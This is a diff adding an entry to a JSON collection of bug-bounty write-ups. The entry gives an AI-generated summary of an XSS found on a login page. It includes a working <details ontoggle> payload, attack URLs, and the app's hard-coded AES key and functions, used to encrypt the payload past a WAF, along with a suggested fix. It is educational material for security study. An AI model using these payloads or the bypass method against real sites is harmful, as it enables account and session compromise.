@@ -1,5 +1,45 @@
 [
   {
+    "id": "1cfb2e8d62fb",
+    "title": "The WAF Said No: Finding XSS Through JavaScript Recon",
+    "url": "https://0xgh4zy.medium.com/the-waf-said-no-finding-xss-through-javascript-recon-2225ef137b52",
+    "source": {
+      "slug": "medium-tag-bug-bounty",
+      "name": "Medium — #bug-bounty"
+    },
+    "authors": [
+      "0xGh4zy"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-10-27T10:09:06.000Z",
+    "added_at": "2026-10-27T11:20:13.059Z",
+    "categories": [
+      "xss"
+    ],
+    "severity": "high",
+    "difficulty": "intermediate",
+    "summary_en": "A stored XSS on the login error message was bypassed by encrypting a malicious payload with a hard‑coded client‑side AES key, evading the WAF’s blacklist.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The root cause is a client‑side blacklist that only blocks a static list of HTML tags while still rendering the msg parameter with dangerouslySetInnerHTML, combined with client‑side encryption that exposes the secret key, allowing attackers to craft encrypted payloads that bypass the WAF.",
+      "walkthrough": "RECON\nStep 1: Open the login page and view its JavaScript files. (HTTP request = a message a browser sends to a server; JavaScript = code that runs in the browser.)\nCode: (none)\nWhy: The JS reveals how the app processes input.\n\nStep 2: Locate the msg parameter used for error messages and see the rendering code.\nCode: if (t.msg) { if (/<(script|form|iframe|object|embed|link|style|meta|img|svg|input|button|textarea|select)[^>]*>/i.test(t.msg)) return void window.history.replaceState({}, \"\", window.location.pathname); A((0,n.jsx)(\"span\",{className:\"server-error-html\",dangerouslySetInnerHTML:{__html:t.msg}})); }\nWhy: The code injects t.msg directly into HTML via dangerouslySetInnerHTML, but first checks a blacklist of tags.\n\nDISCOVERY\nStep 3: Test tags not in the blacklist, e.g., <details> with an ontoggle handler.\nCode: <details open ontoggle=\"alert('Pwned by 0xgh4zy')\"><h2>Pwned by 0xgh4zy</h2></details>\nWhy: The <details> tag is not blocked, so it could execute JavaScript when toggled (ontoggle = event that fires when the element opens/closes).\n\nStep 4: Send the payload as a plain query string.\nCode: https://target.com/login?msg=%3Cdetails%20open%20ontoggle%3D%22alert('Pwned')%22%3E...%3C/details%3E&type=error\nWhy: The WAF inspected the clear‑text request and blocked it.\n\nEXPLOITATION\nStep 5: Notice that the app encrypts both parameter names and values before processing.\nCode: let params = Array.from(D.entries()); … let decodedKey = decrypt(key); let decodedValue = decrypt(value);\nWhy: The server expects encrypted hex strings, so the WAF never sees the raw payload.\n\nStep 6: Find the encryption key and functions in the same JavaScript file.\nCode: let i=\"sWaPVCuq20e1peaZnXL2HyEE4G9VSPhk\"; function o(e){let t=CryptoJS.AES.encrypt(e,i).toString();return CryptoJS.enc.Base64.parse(t).toString(CryptoJS.enc.Hex);} function s(e){let t=CryptoJS.enc.Hex.parse(e).toString(CryptoJS.enc.Base64);return CryptoJS.AES.decrypt(t,i).toString(CryptoJS.enc.Utf8);}\nWhy: The key (i) is hard‑coded and the functions o (encrypt) and s (decrypt) show the exact algorithm (AES → Base64 → Hex).\n\nStep 7: Use the encrypt function to encrypt the parameter name \"msg\" and the malicious <details> payload.\nCode: (example output) 53616c7465645f5f... = encrypted \"msg\"\nWhy: Produces hex strings the server will decrypt back to the original values.\n\nStep 8: Build the final URL with encrypted name and value.\nCode: https://target.com/login/?53616c7465645f5f51d850...=53616c7465645f5f2a9134...\nWhy: The request matches the expected format, bypassing the WAF.\n\nIMPACT\nStep 9: The server decrypts the parameters, renders the <details> element via dangerouslySetInnerHTML, and the browser executes alert('Pwned by 0xgh4zy').\nCode: (browser shows alert)\nWhy: Successful XSS execution proves the vulnerability.",
+      "example": "Example target: https://target.example/login\nVulnerable code (React):\nif (params.msg) {\n  if (/<(script|form|iframe|object|embed|link|style|meta|img|svg|input|button|textarea|select)[^>]*>/i.test(params.msg))\n    return;\n  ReactDOM.render(<span dangerouslySetInnerHTML={{__html: params.msg}}/>, el);\n}\nEncryption (client‑side):\nconst key = \"hardcodedkey123\";\nfunction enc(v){return CryptoJS.enc.Hex.stringify(CryptoJS.enc.Base64.parse(CryptoJS.AES.encrypt(v,key).toString()));}\nAttack payload: <details ontoggle=\"alert('XSS')\">click</details>\nEncrypted name: enc('msg') → 6a7b... ; Encrypted value: enc('<details ontoggle=\"alert(\\'XSS\\')\">click</details>') → a1c4...\nFinal request: https://target.example/login/?6a7b...=a1c4...\nWhy it works: The server decrypts back to the original strings, the blacklist does not block <details>, and dangerouslySetInnerHTML injects it, causing the alert.",
+      "takeaway": "When a web app uses a blacklist to filter HTML, look for tags or events that are not covered, such as <details> with ontoggle. Check if parameters are transformed (encrypted, encoded) client‑side; a hard‑coded key often means you can recreate the transformation and hide the payload from the WAF. Tools like Burp Suite, Chrome DevTools, and CryptoJS decryption scripts help discover these patterns. Variants include using other missing tags (e.g., <svg onload>) or different encoding layers (base64, URL‑encoding). Beginners often forget to test the decrypted values, assuming the WAF will see the payload.",
+      "fix": "Replace the blacklist with a proper allowlist or use a sanitisation library that escapes all HTML before insertion. Do not render user input with dangerouslySetInnerHTML; instead, set textContent or a safe templating engine. Move any encryption logic to the server and never expose the secret key in public JavaScript. Validate and sanitise parameters after decryption on the server side. Example fix:\nif (t.msg) {\n  const safe = DOMPurify.sanitize(t.msg); // removes disallowed tags\n  A((0,n.jsx)(\"span\",{className:\"server-error-html\",dangerouslySetInnerHTML:{__html:safe}}));\n}",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "**Hello hackers,** I’m Youssef Wael (aka 0xGh4zy). In this write-up, I’ll walk you through how I discovered and exploited a XSS vulnerability by analyzing a single JavaScript file in a self-hosted bug bounty program. Press enter or click to view image in full size Image 3 **بسم الله ، اللهم علمنا ما ينفعنا و انفعنا بما علمتنا و زدنا بك علما** let’s get started :) ## It All Started with JavaScript I had a login page and not much else to explore. So, naturally, my first move was to inspect the JavaScript files. After digging through the code, with a little help from AI, I found a parameter named",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 53
+  },
+  {
     "id": "eabced558d19",
     "title": "My First $$ From Real Bug — And It Was Very Simple",
     "url": "https://meetcyber.net/my-first-from-real-bug-and-it-was-very-simple-60cf697649f0",
